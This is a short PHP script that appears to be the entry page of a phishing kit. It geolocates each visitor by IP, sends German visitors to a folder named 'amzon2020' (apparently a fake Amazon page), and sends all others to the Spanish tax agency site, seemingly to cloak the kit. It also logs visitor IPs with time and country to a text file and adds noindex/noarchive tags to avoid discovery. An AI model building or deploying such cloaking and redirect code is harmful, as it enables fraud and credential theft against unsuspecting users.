<?php


$ip = getenv("REMOTE_ADDR");
$time = date('Y-m-d H:i:s');
$random = md5($time);

$random2=rand(0,100000000000);
$randomlink = md5($random2);





if(isset($_SERVER["HTTP_CF_CONNECTING_IP"])){
        $ipadr = $_SERVER["HTTP_CF_CONNECTING_IP"];
// $_SERVER['REMOTE_ADDR']= $_SERVER["HTTP_CF_CONNECTING_IP"]; also possible, no else needed then
    }else{
        $ipadr=$_SERVER['REMOTE_ADDR'];
//when not using cloudflare


    }

// include the php script
include("geoip.inc");

// open the geoip database
$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);


// to get country name
$country_name = geoip_country_name_by_addr($gi, $ipadr);
//echo "Your country name is: $country_name \n";


if(strpos($country_name, "Germany") !== false)
{

header("Location: amzon2020/index.php");


}else{

header("Location: http://www.agenciatributaria.es");

 }

 /// TIME
date_default_timezone_set('GMT');
$TIME = date("d-m-Y H:i:s"); 

/// COUNTRY
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ; // Country

/// VISITOR
$ip = getenv("REMOTE_ADDR");
$file = fopen("vis.txt","a");
fwrite($file,$ip."  -   ".$TIME."                  -        " . $COUNTRY ."\n")  ;
?>

<html xmlns="http://www.w3.org/1999/xhtml">
<meta name="robots" content="noindex">
<meta name="robots" content="noarchive">
</html>